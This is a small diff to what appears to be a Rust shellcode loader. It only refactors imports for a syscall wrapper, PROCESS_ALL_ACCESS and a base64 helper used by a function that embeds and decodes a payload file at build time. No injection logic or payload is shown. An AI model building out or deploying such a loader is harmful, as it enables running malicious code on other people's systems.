@@ -21,7 +21,8 @@ use crate::debug_info_msg;
 
 
 use crate::winapi::constants::PROCESS_ALL_ACCESS;
-use crate::winapi::{syscall_wrapper::SyscallWrapper, types::HANDLE};
+use crate::winapi::nt::syscall_wrapper::SyscallWrapper;
+use crate::winapi::types::HANDLE;
 use crate::winapi::constants::STATUS_SUCCESS;
 
 #[allow(dead_code)]
@@ -41,7 +42,7 @@ pub fn do_load()
 #[cfg(all(feature = "payload_b64"))]
 fn get_shell_code() -> Vec<u8> {
     let base64_shell_code = include_str!(env!("PAYLOAD_FILE_NAME"));
-    crate::helpers::base64_to_vec(base64_shell_code)
+    crate::common::helpers::base64_to_vec(base64_shell_code)
 }
 
 #[cfg(all(feature = "payload_bin"))]
